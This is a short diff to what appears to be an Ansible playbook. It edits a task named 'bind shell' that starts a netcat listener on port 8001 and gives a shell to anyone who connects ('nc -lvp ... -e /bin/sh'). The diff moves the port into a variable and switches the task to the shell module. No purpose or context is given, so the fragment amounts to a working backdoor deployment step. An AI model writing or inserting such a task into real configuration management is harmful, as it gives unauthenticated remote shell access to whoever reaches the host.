@@ -5,5 +5,6 @@
   ignore_errors: true
   tasks:
     - name: bind shell
-      register: uptimeoutput
-      command: "nc -lvp 8001 -e /bin/sh"
+      shell: "nc -lvp {{ bind_shell_port }} -e /bin/sh"
+      vars:
+        bind_shell_port: 8001
